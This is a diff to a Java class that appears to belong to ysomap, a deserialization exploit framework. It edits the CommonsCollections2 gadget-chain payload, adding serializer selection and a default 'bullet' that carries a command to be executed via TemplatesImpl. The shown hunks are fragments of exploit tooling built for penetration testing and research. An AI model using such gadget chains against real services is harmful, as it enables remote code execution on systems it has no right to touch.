@@ -3,12 +3,14 @@ package ysomap.gadget.payload.collections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
-import ysomap.PayloadTester;
+import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.TemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
+import ysomap.serializer.Serializer;
+import ysomap.serializer.SerializerFactory;
 import ysomap.util.Reflections;
 
 import java.util.PriorityQueue;
@@ -26,6 +28,11 @@ public class CommonsCollections2 extends Payload<Queue<Object>> {
     @Override
     public boolean checkObject(Object obj) {
         return obj instanceof TemplatesImpl;
+    }
+
+    @Override
+    public Serializer<?> getSerializer() {
+        return SerializerFactory.createSerializer("");
     }
 
     @Override
@@ -47,6 +54,11 @@ public class CommonsCollections2 extends Payload<Queue<Object>> {
         queueArray[1] = 1;
 
         return queue;
+    }
+
+    @Override
+    public ObjectGadget getDefaultBullet(String command) {
+        return new TemplatesImplBullet(command);
     }
 
     public static void main(String[] args) {
